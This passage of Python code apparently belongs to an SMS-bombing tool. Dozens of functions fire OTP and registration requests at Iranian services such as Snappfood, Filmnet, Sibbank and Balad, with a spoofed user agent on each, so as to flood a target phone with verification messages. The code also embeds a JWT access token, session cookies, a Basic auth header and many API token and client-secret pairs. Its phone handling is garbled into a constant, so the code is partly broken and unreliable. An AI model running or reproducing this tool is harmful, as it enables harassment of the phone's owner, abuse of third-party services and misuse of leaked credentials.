jwt-access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYxZTA5NjE5ZjVmZTNkNmRlOTMwYTQwY2I5NzdlMTBhYWY2Y2MxYWIzYTNhNjYxM2U2YWFmZGNkMzhhOTY0Mzg1NjZkMzIyMGQ3NDU4MTc2In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNjFlMDk2MTlmNWZlM2Q2ZGU5MzBhNDBjYjk3N2UxMGFhZjZjYzFhYjNhM2E2NjEzZTZhYWZkY2QzOGE5NjQzODU2NmQzMjIwZDc0NTgxNzYiLCJpYXQiOjE2MzkzMTQ4NjMsIm5iZiI6MTYzOTMxNDg2MywiZXhwIjoxNjQxOTkzMzgzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.aRR7PRnrh-hfQEhkG2YnN_AJL3AjGsI2LmWwRufsvnD6enxPGJQXyZFn9MoH3OSBPmgXFMoHmCnbXvxoDA5jeRdmUvy4swLbKZf7mfv2Zg4CEQusIGgBHeqMmI31H2PIhCLPtShg0trGgzs-BUCArzMM6TV7s1P6GKMhSyXXVzxj8duJxdiNTVx5IeO8GAo8hpt6pojbp3q07xhECgK-8-3n8qevV9CRBtIwhkhqrcubgrQk6ot64ksiosVhHhvI-xVm1AW8hArI62VcEv-13AH92e9n30auYYKC961wRU6_FUFzauHqSXlhWBgZo6-uO9gwrLA7g0_91G8Eu98V4cKsVWZaRLRP1-tQE9otJduaSvEF4e88FdgW3A045Bd0I2F5Uri2WEemVyMV8CVT8Kdio6iBwGl8dLQS7SJhK7OYwTp_S7AZ9A4wJJbTuw-rU4_ykM2PlR5tNXwTNpcEdiLdglFsv9c0NOyClMIsAU7t7NcYcxdQ5twSDWPUmKK-k0xZMdeACUclkYYFNPqGSccGX0jpioyET0sMFrHQyeOvHxGPLfMeoTaXUA8LMognQ3oCWCsZHrcaQSJJ7H9WUIf4SYUvRwp-RE4JUxpOXvxgPjk0b1VUYF0dHjf1C-uQ3D7aYEAuzSW0JWyEFhurNpBaeQQhf35HH-SchuWCjafAr8rU0BCNkQJd4aresr7moHos1a_KoeQ2Y1HloPzsjOzRSpK97vApN0naRwK8k9RsoN65URZDbEzTc1b2dpTUR-VJw7lU0v5jT_PvZs7GUnpnv23UrYQIfMKISF9suy6ufb26DdIAr2pLOQ9NKqxb4QwDadFa1gPIpb_QU-8hL6N9533YTvTE8xJJjjwE6IQutNsZ1OdBdrj4APjNczDpb3PFaXtI0CbOKHYIUDsdyEIdF1o9RYrKYj-EP61SA0gzks-qYGJR1jnfQRkwkqoolu2lvDK0PxDXnM4Crd4kJRxVtrsD0P8P-jEvW6PYAmxXPtnsu5zxSMnllNNeOOAijcxG6IyPW-smsHV-6BAdk5w3FXAPe0ZcuDXb0gZseq2-GnqxmNDmRWyHc9TuGhAhWdxaP-aNm6MmoSVJ-G6fLsjXY3KLaRnIhmNfABxqcx0f03g6sBIh_1Rw965_WydlsMVU_K5-AIfsXPSxSmVnIPrN4VasUnp3XbJmnO9lm_rrpdNAM3VK20UPLCpxI7Ymxdl9wboAg8cdPlyBxIcClwtui0RC1FGZ-GpvVzWZDq_Mu6UEbU3bfi9Brr5CJ-0aa8McOK8TJBHCqfLHYOOqAruaLHhNR0fjw-bIzHLKtxGhwkkGp7n_28HtbiZVKqr48rBfbhzanCpSPYGDV4PM1_zrJDUJn4sRitw_Z78Lju3ssjuMae8zAEdHUCHGui_tYMABlPVaZhsB4s-KahT4aTOhzd7ejjoLE9WQUSuQBmMTGFZM0xH0Phyz1vSl7_5IpTHcCwTXUx3s8UvRB-Q3QQBa5O82gtZWTd56R7u0YrCJKVEnsf9a9lZz9Of6R4YdPhwByMvHFfbRLgNkuGzv75dZZf24KmbPTZN4sVCZgxD7oO0sTgh2hEYMSmdHnXvCySXZk_1G52yP8S7IwnEXRq_Hu1aje2dz0FRWYFR8nnmFuRyYSfj1rSy1Vut4ktNUsstlAYn8QmsvNqyn402aikpuG6s0ApOGMuLChv_BDd_tbsLu11-qLv3r5Exza9XJMq4aOFegpPJ5vH75entTpxPa16gmJ80lhlvKux0vnZI-mEDZ8zEI5uXi26zv4taUqLNw5nXQZbi8sxh90nYF1fNAQ-ERHQmoUeqAwL9AuZobvR7pRMmmjZMPeeDPPFrNDyCHYFO_Iu5kClQM_7jzmsLkOvCD68DkwhwftkNvTiA-dDqkkNpY8OB0GI4ynhrAqHN4Y378qbks7q4ifUU1NsSI5xdkHC4fseKMJTnnCYdyfhH14_X46zuAvSIL7DX262VTb6dAIN5KoHkjacc77Z4V7HsncWBysaXqK5yUIkL3JB5AiZlp8nV0_hCjNfA3QsfGQVoMYYeoTIutKF9Hr9r1efOXmTU0URZ-C6LYgzcntKlryroLwVg5jP3s2jQyCTIvs4CitUAyJEC3VyeW_VlSA02uMqxB-pjkipGEKe3KO1diCU7afe0xkd5C4K1NG-kLAbRAhCCtLRVJVSP0a_t84F737B9lub6bs5QcCvxARlfogXerUg9MjMU9qCWLzN9x2MukbsijxzmsGFcw-OBecMETDwoyB_0HrxP95QCwxw_X4rcW60HL45xbv9iC-gsn1qd-FKzO-XSYU0VWprr_z12bl9QOnpMc6OYf74IeJ27zl1nWR_gLo-Wg-WeFDyWcpNjmiHZkHYiDa1c3RgFv2t4ezYP0tsQEzLy-Yx0yB7WI5Z2kd_cSuaX73U9PW7rOCGnCD9cfyxZ27VyiHx8YMKKch6lyNmwPGfMhYqgMMo4NLmKy44taXRKPV20DhIsuNdMPcPUofrrrTsKarxurCX8EwRev4Ox-GcP-ocFtjKq_jkGRnqh4QQrJJh3Unpxm3sHcWhIWkNIcyChdjwnHPqKLb49UbVyJKxkt26E-cuO7_oC7PbMe8YjKFrmr2_igqr9i-YioVy1MdI5TL9sZhS8bMwG2rMozBYqWT9czRIKwabP9dUKpEn-d1nLbdrEeSzXOLYtXutiO57lGpxTDgf3ELp1zIEvTW7SEJBQ; crisp-client%2Fsession%2F4df7eed4-f44a-4e3d-a5cc-98ec87b592bc=session_69ff5918-b549-4c78-89fd-b851ca35bdf6; crisp-client%2Fsocket%2F4df7eed4-f44a-4e3d-a5cc-98ec87b592bc=0','origin': 'https://snappfood.ir','referer': 'https://snappfood.ir/','user-agent': generate_user_agent(os="linux")}
        sfoodD = {"cellphone": "0"+("+90")[1]}
        try:
            post(url=sfoodU,  headers=sfoodH, data=sfoodD)
            return True
        except:
            pass





    def smarket(phone):
        smarketU = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{("+90")[1]}'
        smarketH = {'referer': 'https://snapp.market/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=smarketU, headers=smarketH)
            return True
        except:
            pass


  

    def sTrip(phone):
        sTripH = {"Host": "www.snapptrip.com", "User-Agent": generate_user_agent(os="win"), "Accept": "*/*", "Accept-Language": "fa", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json; charset=utf-8", "lang": "fa", "X-Requested-With": "XMLHttpRequest", "Content-Length": "134", "Origin": "https://www.snapptrip.com", "Connection": "keep-alive", "Referer": "https://www.snapptrip.com/","Cookie": "route=1597937159.144.57.429702; unique-cookie=KViXnCmpkTwY7rY; appid=g*-**-*; ptpsession=g--196189383312301530; _ga=GA1.2.118271034.1597937174; _ga_G8HW6QM8FZ=GS1.1.1597937169.1.0.1597937169.60; _gid=GA1.2.561928072.1597937182; _gat_UA-107687430-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=445b5d83-abeb-7ffd-091e-ea1ce5cfcb52; analytics_token=2809eef3-a3cf-7b9c-4191-8d8be8e5c6b7; yektanet_session_last_activity=8/20/2020; _hjid=b1148e0d-8d4b-4a3d-9934-0ac78569f4ea; _hjAbsoluteSessionInProgress=0; MEDIAAD_USER_ID=6648f107-1407-4c83-97a1-d39c9ec8ccad", "TE": "Trailers"}
        sTripD = {"lang": "fa", "country_id": "860", "password": "snaptrippass", "mobile_phone": "0" + ("+90")[1], "country_code": "+90", "email": "example@gmail.com"}
        try:
            post(url='https://www.snapptrip.com/register',  headers=sTripH, json=sTripD)
            return True
        except:
            pass


    def filmnet(phone):
        fnU = f"https://api-v2.filmnet.ir/access-token/users/{phone}/otp"
        fNh = {'Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','DNT': '1','X-Platform': 'Web','User-Agent': generate_user_agent(os="win"),'Origin': 'https://filmnet.ir','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://filmnet.ir/','Accept-Language': 'fa,en-US;q=0.9,en;q=0.8','Cache-Control': 'no-cache','Accept-Encoding': 'gzip, deflate'}
        try:
            get(url=fnU, headers=fNh)
            return True
        except:
            pass


    def drdr(phone):
        dru = f"https://drdr.ir/api/registerEnrollment/sendDisposableCode"
        drh = {'Connection': 'keep-alive','Accept': 'application/json','Authorization': 'hiToken','User-Agent': generate_user_agent(os="win"),'Content-Type': 'application/json;charset=UTF-8','Origin': 'https://drdr.ir','Referer': 'https://drdr.ir/','Accept-Language': 'en-US,en;q=0.9','Accept-Encoding': 'gzip, deflate'}
        try:
            post(url=dru, headers=drh, params={"phoneNumber": phone, "userType": "PATIENT"})
            return True
        except:
            pass



    def itoll(phone):
        itJ = {'mobile': phone}
        itU = 'https://app.itoll.ir/api/v1/auth/login'
        itH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'fa','content-type': 'application/json;charset=UTF-8','origin': 'https://itoll.ir','referer': 'https://itoll.ir/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=itU, headers=itH, json=itJ)
            return True
        except:
            pass




    def namava(num):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",json={"UserName": phone},headers=rhead ,timeout=5)
            return True
        except:
            pass



    def anar(phone):
        anrJ = {'user': phone, 'app_id': 99}
        anrU = 'https://api.anargift.com/api/people/auth'
        anrH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '34','content-type': 'application/json;charset=UTF-8','origin': 'https://anargift.com','referer': 'https://anargift.com/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=anrU, headers=anrH, json=anrJ)
            return True
        except:
            pass


    def azki(phone):
        azkU = f'https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B"phoneNumber":"azki_{phone}"%7D'
        azkH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','authorization': 'Basic QmltaXRvQ2xpZW50OkJpbWl0b1NlY3JldA==','device': 'web','deviceid': '6','password': 'BimitoSecret','origin': 'https://www.azki.com','referer': 'https://www.azki.com/','user-agent': generate_user_agent(os="linux"),'user-token': 'LW6H4KSMStwwKXWeFey05gtdw2iW8QRtSk70phP6tBJindQ4irdzTmSqDI9TkVqE','username': 'BimitoClient'
        }
        try:
            post(url=azkU, headers=azkH)
            return True
        except:
            pass


    def nobat(phone):
        noJ = {'mobile': phone}
        noU = 'https://nobat.ir/api/public/patient/login/phone'
        noH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','access-control-request-headers': 'nobat-cookie','access-control-request-method': 'POST','origin': 'https://user.nobat.ir','referer': 'https://user.nobat.ir/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=noU, headers=noH, json=noJ)
            return True
        except:
            pass

            pass

    def drsaina(phone):
        ghD = f"__RequestVerificationToken=CfDJ8NPBKm5eTodHlBQhmwjQAVUgCtuEzkxhMWwcm9NyjTpueNnMgHEElSj7_JXmfrsstx9eCNrsZ5wiuLox0OSfoEvDvJtGb7NC5z6Hz7vMEL4sBlF37_OryYWJ0CCm4gpjmJN4BxSjZ24pukCJF2AQiWg&noLayout=False&action=checkIfUserExistOrNot&lId=&codeGuid=00000000-0000-0000-0000-000000000000&PhoneNumber={'0'+('+90')[1]}&confirmCode=&fullName=&Password=&Password2="
        ghU = 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation'
        ghH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','cookie': '.AspNetCore.Antiforgery.ej9TcqgZHeY=CfDJ8NPBKm5eTodHlBQhmwjQAVWqg8-UO73YXzMYVhYk28IlZQexrnyEhYldxs2Ylnp3EZE2o3tccNQ0E7vRSUGVMNDfmcFOKPcUCG7sysT7unE5wui_vwzMvyCNDqIRZ1Wxd2AKD3s3lu-2BvFOXc_j7ts; anonymousId=-fmvaw07O1miRXbHtKTVT; segmentino-user={"id":"-fmvaw07O1miRXbHtKTVT","userType":"anonymous"}; _613757e830b8233caf20b7d3=true; _ga=GA1.2.1051525883.1639482327; _gid=GA1.2.2109855712.1639482327; __asc=bf42042917db8c3006a2b4dcf49; __auc=bf42042917db8c3006a2b4dcf49; analytics_token=a93f2bb1-30d0-4e99-18cc-b84fcda27ae9; yektanet_session_last_activity=12/14/2021; _yngt_iframe=1; _gat_UA-126198313-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_session_token=efcee442-344d-1374-71b8-60ca960029c9; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _gac_UA-126198313-1=1.1639482345.EAIaIQobChMImrmRrJvj9AIV2ZTVCh07_gUpEAAYASAAEgILoPD_BwE; cache_events=true','origin': 'https://www.drsaina.com','referer': 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation','upgrade-insecure-requests': '1','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=ghU, headers=ghH, data=ghD).text
            return True
        except:
            pass


    def deyfriedchicken(phone):
        js = {"apiToken":"VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq","clientSecret":"7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq","device":"web","username":"0" + ("+90")[1]}

        rhead = {"user-agent": generate_user_agent()}
        try: #shop.deyfriedchicken.com
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass


            
    def donergarden(phone):
        js = {"apiToken":"Ex0OHO6iS8ZfklgSKhaTmWAp34lYLNLFZvMXiuVfhc2ov2uq9kpwYUUrxTWNnhWE","clientSecret":"BuUDcLI9IMQNpWeaHYtVfKzoxwEZNza4","device":"web","username":"0" + ("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #donergarden.com
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass
            
            
    def foodbell(phone):
        js = {"apiToken":"WTKnmBBIpjL8kcOo7YGD0qkaa6p06bVER9IMUNsyVOj9J2AMlmjESWhqtuNqWBNN","clientSecret":"aINO67nX5aCs5e7382XQJZkYbROBBewt","device":"web","username":"0" + ("+90")[1]}

        rhead = {"user-agent": generate_user_agent()}
        try: #foodbell.ir
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

            
    def foodiran16(phone):
        js = {"apiToken":"mUkchCAJ9Po58IqEzz507gKwv5mz2kzplUctHuTxXDrTAfjfHyPJqXKGJxrnaKSX","clientSecret":"HVB23K4Y9LPvOLuUCTo3QOHolaYGupgP","device":"web","username":"0" + ("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #foodiran16.com
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

            
    def foodlandkish(phone):
        js = {"apiToken":"KbCO8YaHKctowfL1Rny8gB9A9B2kGZvHJBbN918Nsn1p2Ui0FbLWdJ1JdCQ6hzAu","clientSecret":"MvfPc5BT2lRrpmOCYZzAAGg7d7J8ZVnv","device":"web","username":"0" + ("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #foodlandkish.com
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

            
    def garcon(phone):
        js = {"phone":"0" + ("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://garcon.tandori.ir/users/v1/main/login",json=js, headers=rhead)
            return True
        except:
            pass

            
    def gelatohouse(phone):
        js = {"apiToken":"10tQStiKTniALgYpYQ4hm0UCuadXWbHdMklMIpyTE5DSzkNSfx1r2p02pqg3QKx3","clientSecret":"MZ0TNC0swsGFk6gbfCdvtZHRukZyFntu","device":"web","username":"0" + ("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #order.gelatohouse.ir
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

            
    def givernfood(phone):
        js = {"apiToken":"iIWfAtW16GstuASFfuUO0iY9LKz3dKQpdsKZ2ANBK5YokN2J7pom4oq0tYTz5eXv","clientSecret":"mpZYwzraYAyzcpD594LpWbHwTgHIcdNO","device":"web","username":"0" + ("+90")[1]}

        rhead = {"user-agent": generate_user_agent()}
        try: #givernfood.com
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

            
    def mahiyekhoob(phone):
        js = {"apiToken":"yJHp0J8gMDyUlAvrWC2E7G0OITtM18WXdRZdGSC2gKkkC8QHDBDsf5irJ4gpZvqP","clientSecret":"uTsq8sG1YWuIWcvK24UFtPighOfrl2H6","device":"web","username":"0" + ("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #mahiyekhoob.com
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

            
    def nesengrill(phone):
        js = {"apiToken":"GAbsdbjms1fx2ow35UnRCxxIbYPaNTfbq67clc9r09TtjqcxzrAbNFLTNSRFLJZZ","clientSecret":"gK6flStcuutxn82oGDqGqFqrvDTTQEZ2","device":"web","username":"0" + ("+90")[1]}

        rhead = {"user-agent": generate_user_agent()}
        try: #nesengrill.ir
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

            
    def pirankalaco(phone):
        head = {'accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '17','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://pirankalaco.ir','Referer': 'https://pirankalaco.ir/shop/login.php','Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"','Sec-Ch-Ua-mobile': '?0','Sec-Ch-Ua-platform': 'Windows','Sec-Fetch-Dest': 'empty','User-Agent': generate_user_agent(os="win"),'X-Requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://pirankalaco.ir/shop/SendPhone.php",data=f"phone=0{('+90')[1]}",headers=head)
            return True
        except:
            pass

            
    def pizzapanjereh(phone):
        js = {"apiToken":"lv3sgZvKKUgc3GpayVVBq8Sw3tguTk9IYbGIXhLGjnhDQtyTNwD2gzwncF1x4B1j","clientSecret":"Vvo4qB2gRUNwev5A2w5osgS19HhAmAUM","device":"web","username":"0" + ("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #pizzapanjereh.com
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

        
    def shandiz(phone):
        js = {"apiToken":"sNpW61dZELLTwNhUD2YDsVuwMvzUihTLIEYpCSJDjXfH7GMfmDr9j5eWc4KJAJ2h","clientSecret":"va41e57WSFf6qO8o6i9oiAe5PcLuG3lS","device":"web","username":"0" + ("+90")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #shandiz.co
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
        except:
            pass

            
    def tnovin(phone):
        head = {'accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '17','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Host': 'shop.tnovin.com','Origin': 'http://shop.tnovin.com','Referer': 'http://shop.tnovin.com/login','Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"','Sec-Ch-Ua-mobile': '?0','Sec-Ch-Ua-platform': 'Windows','Sec-Fetch-Dest': 'empty','User-Agent': generate_user_agent(os="win"),'X-Requested-with': 'XMLHttpRequest'}
        try: 
            post(url="http://shop.tnovin.com/login",data=f"phone=0{('+90')[1]}",headers=head)
            return True
        except:
            pass

    def dastkhat(phone):
        n4 = {"mobile":('+90')[1],"countryCode":90,"device_os":2}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://dastkhat-isad.ir/api/v1/user/store",json=n4, headers=rhead)
            return True
        except:
            pass

    def hamlex(phone):
        n4 =  f"fullname=%D9%85%D9%85%D8%AF&phoneNumber=0{('+90')[1]}&register="
        h4 = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '61','Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://hamlex.ir','Referer': 'https://hamlex.ir/register.php','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','User-Agent': generate_user_agent(os="win")}
        try: 
            post(url="https://hamlex.ir/register.php",data=n4,headers=h4)
            return True
        except:
            pass

    def irwco(phone):
        n4 =  f"mobile=0{('+90')[1]}"
        h4 = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '18','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://irwco.ir','Referer': 'https://irwco.ir/register','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': generate_user_agent(os="win"),'X-Requested-Rith': 'XMLHttpRequest'}
        try: 
            post(url="https://irwco.ir/register",data=n4,headers=h4)
            return True
        except:
            pass

            
    def moshaveran724(phone):
        n4 =  f"againkey=0{('+90')[1]}&cache=false"
        h4 = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '32','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://moshaveran724.ir','Referer': 'https://moshaveran724.ir/user/register/','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://moshaveran724.ir/m/pms.php",data=n4,headers=h4)
            return True
        except:
            pass

            
    def sibbank(phone):
        n4 = {"phone_number": "0" + ("+90")[1]}
        h4 = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.5','connection': 'keep-alive','content-length': '30','content-type': 'application/json','host': 'api.sibbank.ir','origin': 'https://sibbank.ir','referer': 'https://sibbank.ir/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','TE': 'trailers','user-agent': generate_user_agent(os="mac")}
        try: 
            post(url="https://api.sibbank.ir/v1/auth/login",json=n4,headers=h4)
            return True
        except:
            pass

            
    def snapp_link(phone):
        n4 = {"phone": "0" + ("+90")[1]}
        h4 = {'Accept': 'application/json','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '23','Content-Type': 'application/json','Origin': 'https://snapp.ir','Referer': 'https://snapp.ir/','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','User-Agent': generate_user_agent(os="win")}
        try: 
            post(url="https://api.snapp.ir/api/v1/sms/link",json=n4,headers=h4)
            return True
        except:
            pass







    def alopeyk(phone):
        n4 = {"type":"CUSTOMER","model":"Chrome 104.0.0.0","platform":"pwa","version":"10","manufacturer":"Windows","isVirtual":False,"serial":True,"app_version":"1.2.6","uuid":True,"phone":"0"+('+90')[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://api.alopeyk.com/api/v2/login?platform=pwa",json=n4, headers=rhead)
            return True
        except:
            pass

    def alopeyk_safir(phone):
        n4 = {'phone':'0'+('+90')[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://api.alopeyk.com/safir-service/api/v1/login",json=n4, headers=rhead)
            return True
        except:
            pass

    def balad(phone):
        n4 = {"phone_number":"0"+('+90')[1],"os_type":"W"}
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '44','content-type': 'application/json','device-id': '572a5145-d472-430a-9614-b258232873e6','origin': 'https://balad.ir','referer': 'https://balad.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://account.api.balad.ir/api/web/auth/login/",json=n4, headers=rhead)
            return True
        except:
            pass

    def chaymarket(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{('+90')[1]}&csrf=c832b38a97&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '143','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.chaymarket.com','referer': 'https://www.chaymarket.com/user/my-account/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://www.chaymarket.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

    def coffefastfoodluxury(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B90&mobileNo=0{('+90')[1]}&csrf=e23c15918c&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B90&digits_reg_mail=0{('+90')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=e23c15918c"

        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '248','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://coffefastfoodluxury.ir','referer': 'https://coffefastfoodluxury.ir/product-category/coffeshop/?login=true&page=1&redirect_to=https%3A%2F%2Fcoffefastfoodluxury.ir%2Fproduct-category%2Fcoffeshop%2F','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://coffefastfoodluxury.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

    def dadhesab(phone):
        n4 = {"username":"0"+('+90')[1]}
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','Connection': 'keep-alive','content-length': '26','content-type': 'application/json;charset=UTF-8','host': 'api.dadhesab.ir','origin': 'https://app.dadhesab.com','referer': 'https://app.dadhesab.com/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': generate_user_agent(os="win")}
        try: 
            post(url="https://api.dadhesab.ir/user/entry",json=n4, headers=rhead)
            return True
        except:
            pass

    def dosma(phone):
        n4 = {"username":"0"+('+90')[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://app.dosma.ir/sendverify/",json=n4, headers=rhead)
            return True
        except:
            pass

    def ehteraman(phone):
        n4 = {"mobile":"0"+('+90')[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://api.ehteraman.com/api/request/otp",json=n4, headers=rhead)
            return True
        except:
            pass

    def flightio(phone):
        n4 = {"userKey":"90-"+('+90')[1],"userKeyType":1}
